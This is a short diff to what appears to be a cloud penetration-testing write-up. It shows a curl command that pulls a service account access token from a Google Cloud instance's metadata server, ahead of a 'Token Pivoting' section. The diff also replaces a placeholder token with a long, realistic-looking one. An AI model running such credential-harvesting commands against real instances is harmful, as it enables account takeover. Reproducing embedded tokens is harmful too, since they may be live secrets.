@@ -204,7 +204,7 @@ Querying the service account authentication token, which appears to be valid for
 
 ```bash
 curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
-{"access_token":"ya29.c.ABC123","expires_in":1676,"token_type":"Bearer"}
+{"access_token":"ya29.c.KqUBuAfh01CzhYCWOdbI9m9hx3pObivDuYw6WER2X06r7lB60Biyl8Ur0E-78riuHZa47yqriWSL2fJOZ8CJC6D_F9q6bxun1BE72HnWhuzo_KI43DRj-J60R4fd_vKHQxoQa3rsWEZbfGgH3akYP7aXzJiI29M_0THL6dt74J8Yme3L9-HgLgHWx3gA9q0IACAS7_WZLwcCtSRxZBh","expires_in":1676,"token_type":"Bearer"}
 ```
 
 ## Token Pivoting
